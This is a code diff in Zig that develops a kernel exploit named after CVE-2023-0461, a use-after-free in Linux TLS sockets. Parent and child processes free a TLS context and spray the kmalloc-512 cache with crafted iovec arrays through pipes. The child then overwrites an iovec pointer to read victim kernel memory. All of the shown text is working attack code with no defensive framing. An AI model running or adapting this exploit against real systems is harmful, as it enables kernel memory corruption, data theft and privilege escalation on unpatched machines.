@@ -213,26 +213,31 @@ fn cve_2023_0461() !void {
         defer os.closeSocket(client_sk);
         try sync.wait(1);
         try retry_connect(client_sk, target_addr_p, addr_sz);
-        try sync.wait(2);
 
-        os.nanosleep(5, 0);
-        log.info("child: unblock parent", .{});
+        log.info("child: wait for parent to enter writev", .{});
 
         {
-            var buf: [256]u8 = .{0x41} ** 256;
+            var buf: [2048]u8 = .{0x41} ** (mem.page_size / 2);
             const len = try os.read(spray[0], &buf);
 
-            log.info("child: read {}: {s}", .{ len, std.fmt.fmtSliceEscapeLower(buf[0..len]) });
+            log.info("child: read {}: {s}", .{
+                len,
+                std.fmt.fmtSliceEscapeLower(buf[0..@min(64, len)]),
+            });
         }
 
         log.info("child: try overwrite iovec", .{});
         try setTLSOpt(target_sk, .RX);
 
+        log.info("child: read victim data", .{});
         {
-            var buf: [256]u8 = .{0x42} ** 256;
+            var buf = [_]u8{0x42} ** (2048 + 4096 + 512);
             const len = try os.read(spray[0], &buf);
 
-            log.info("child: read {}: {s}", .{ len, std.fmt.fmtSliceEscapeLower(buf[0..len]) });
+            log.info("child: read {}: {s}", .{
+                len,
+                std.fmt.fmtSliceEscapeLower(buf[@min(len, 2048 + 4096)..len]),
+            });
         }
 
         try sync.cont(3);
@@ -258,28 +263,35 @@ fn cve_2023_0461() !void {
     const client_sk = try os.accept(target_sk, null, null, 0);
     log.info("parent: free the context", .{});
     os.closeSocket(client_sk);
-    try sync.cont(2);
 
     log.info("parent: wait for deferred free", .{});
-    os.nanosleep(5, 0);
+    os.nanosleep(6, 0);
 
     // 17 * 16 = 272 > 256 so that we are in kmalloc-512
-    const overwritten = [_]u8{ 'n', 'o', 'p', 'e' } ** 64;
+    const blocker: [4096 * 2]u8 = .{ 'b', 'l', 'o', 'k' } ** (1024 * 2);
+    const overwritten: [512]u8 = .{ 'n', 'o', 'p', 'e' } ** 128;
     const iov_zero = [1]iovec_const{.{ .iov_base = null, .iov_len = 0 }};
-    const iov_dummy = [1]iovec_const{.{
-        .iov_base = &overwritten,
+    const iov_blocker = [1]iovec_const{.{
+        .iov_base = &blocker,
+        .iov_len = blocker.len,
+    }};
+    const iov_victim = [1]iovec_const{.{
+        .iov_base = 0,
         .iov_len = overwritten.len,
     }};
     const iov: [17]iovec_const =
-        iov_dummy ++
+        iov_blocker ++
         (iov_zero ** 2) ++
-        iov_dummy ++
+        iov_victim ++
         (iov_zero ** 13);
 
     {
         const len = try writev(spray[1], &iov);
-        if (len != 512)
-            log.err("parent: {} != 512", .{len});
+        if (len != overwritten.len + blocker.len)
+            log.err("parent: {} != {}", .{
+                len,
+                blocker.len + overwritten.len,
+            });
     }
 
     try sync.wait(3);
